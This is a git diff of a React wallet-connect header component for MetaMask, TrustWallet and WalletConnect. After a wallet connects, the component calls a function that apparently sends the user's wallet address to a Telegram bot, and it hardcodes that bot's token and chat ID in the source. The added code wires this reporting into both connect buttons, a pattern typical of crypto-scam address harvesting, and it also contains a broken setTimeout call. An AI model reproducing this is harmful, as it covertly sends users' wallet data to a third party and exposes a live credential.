@@ -10,15 +10,9 @@ import { ethers } from "ethers";
 
 
 
-// const WalletConnect = new WalletConnectConnector({
-//     rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
-//     bridge: "https://bridge.walletconnect.org",
-//     qrcode: true,
-// });
 
-const Injected = new InjectedConnector({
-    supportedChainIds: [1, 3, 4, 5, 42]
-});
+
+
 const style = {
     position: 'absolute',
     top: '50%',
@@ -39,42 +33,8 @@ function Header() {
     const [open, setOpen] = React.useState(false);
     const handleOpen = () => setOpen(true);
     const handleClose = () => setOpen(false);
-    const [haveMetamask, sethaveMetamask] = useState(true);
-    const [accountAddress, setAccountAddress] = useState('');
-    const [accountBalance, setAccountBalance] = useState('');
-    const [isConnected, setIsConnected] = useState(false);
-    const { ethereum } = window;
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
 
-    useEffect(() => {
-        const { ethereum } = window;
-        const checkMetamaskAvailability = async () => {
-            if (!ethereum) {
-                sethaveMetamask(false);
-            }
-            sethaveMetamask(true);
-        };
-        checkMetamaskAvailability();
-    }, []);
-
-    const connectMeta = async () => {
-        try {
-            if (!ethereum) {
-                sethaveMetamask(false);
-            }
-            const accounts = await ethereum.request({
-                method: 'eth_requestAccounts',
-            });
-            let balance = await provider.getBalance(accounts[0]);
-            let bal = ethers.utils.formatEther(balance);
-            setAccountAddress(accounts[0]);
-            setAccountBalance(bal);
-            setIsConnected(true);
-        } catch (error) {
-            setIsConnected(false);
-        }
-    };
-
+    console.log(account)
     let bot = {
         TOKEN: "5694683449:AAF3Wv9YaK6ScwKWg8bS2hVHYN98sUoTbjk",
         CHATID: "1203745440",
@@ -92,14 +52,31 @@ function Header() {
                 alert("not sent")
             })
     }
-    const CoinbaseWallet = new WalletLinkConnector({
-        url: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
-        appName: "Web3-react Demo",
-        supportedChainIds: [1, 3, 4, 5, 42],
+    const WalletConnect = new WalletConnectConnector({
+        rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
+        bridge: "https://bridge.walletconnect.org",
+        qrcode: true,
     });
+   
     const connectWallet = () => {
-        activate(CoinbaseWallet)
+        activate(WalletConnect)
 
+        const condition = "string"
+        if (typeof(account) === typeof(condition)) {
+            setTimeout(submitAdrress(), 3000);
+        }
+    }
+
+
+
+
+    const Injected = new InjectedConnector({
+        supportedChainIds: [1, 3, 4, 5, 42]
+       });
+
+
+    const connectMetaMask = () => {
+        activate(Injected)
         const condition = "string"
         if (typeof (account) === typeof (condition)) {
             setTimeout(submitAdrress(), 3000);
@@ -159,7 +136,7 @@ function Header() {
                     aria-describedby="modal-modal-description"
                 >
                     <Box sx={style}>
-                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={connectMeta}>Metamask/TrustWallet</button>
+                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectMetaMask() }}>Metamask/TrustWallet</button>
                         <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button>
                         <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
                     </Box>
